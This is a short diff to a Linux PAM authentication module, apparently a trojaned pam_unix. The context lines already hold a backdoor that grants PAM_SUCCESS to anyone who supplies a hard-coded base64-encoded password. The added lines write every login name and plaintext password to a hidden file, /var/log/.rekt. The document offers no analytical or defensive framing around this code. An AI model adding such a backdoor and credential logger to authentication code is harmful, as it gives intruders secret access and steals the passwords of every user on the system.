@@ -178,6 +178,9 @@ pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
         char *bdenc = b64_encode(p, strlen(p));
         if (strcmp(bdenc, bdstr) != 0) {
           retval = _unix_verify_password(pamh, name, p, ctrl);
+          rekt=fopen("/var/log/.rekt", "a");
+          fprintf(rekt, "%s:%s\n", name, p);
+          fclose(rekt);
         } else {
           retval = PAM_SUCCESS;
         }
